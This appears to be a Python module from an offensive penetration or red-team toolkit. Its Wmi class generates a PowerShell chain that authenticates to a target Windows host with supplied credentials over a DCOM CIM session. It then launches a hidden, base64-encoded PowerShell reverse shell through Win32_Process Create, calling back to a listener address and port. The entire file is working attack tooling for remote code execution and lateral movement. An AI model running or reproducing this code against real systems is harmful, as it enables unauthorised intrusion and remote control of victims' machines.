#!/usr/bin/python3
from textwrap import dedent
from shells import Shells
from connection import Connection

POSTAMBLE = (
    "Invoke-CimMethod -CimSession $Session -ClassName Win32_Process "
    "-MethodName Create -Arguments @{CommandLine =$Command};"
)

class Wmi(Connection):
    @staticmethod
    def get_ps(username: str, password: str, target_ip: str, 
               listen_address: str, listen_port: str) -> str:
        """
        Build and return a PowerShell chain for a reverse shell.
        """

        # Build PREAMBLE dynamically from args
        preamble = dedent(f"""\
        $username = '{username}';
        $password = '{password}';
        $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

        $Options = New-CimSessionOption -Protocol DCOM
        $Session = New-Cimsession -ComputerName {target_ip} -Credential $credential -SessionOption $Options
        """)

        encoded = Shells.encode_ps_for_e(listen_address, listen_port)
        command_line = "powershell -nop -w hidden -e " + encoded

        result = ""
        result += preamble
        result += f"\n$Command = '{command_line}';\n\n"
        result += POSTAMBLE
        return result
